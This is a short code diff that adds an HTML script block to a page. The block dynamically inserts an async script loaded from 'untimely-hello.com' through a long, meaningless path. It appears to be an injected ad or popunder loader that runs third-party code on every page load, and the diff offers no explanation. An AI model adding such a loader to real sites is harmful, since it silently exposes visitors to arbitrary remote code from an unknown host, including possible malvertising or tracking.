@@ -1,0 +1,12 @@
+<script>
+(function(nsr){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = nsr || {};
+s.src = "\/\/untimely-hello.com\/bWX\/V\/s.d\/Gslj0mYdWIcS\/keTma9Mu\/Z\/Uxl\/kkPMT\/chw\/MyjGA\/yKNFTfM\/tbNFzBA-yPMpDlId1pN-wT";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
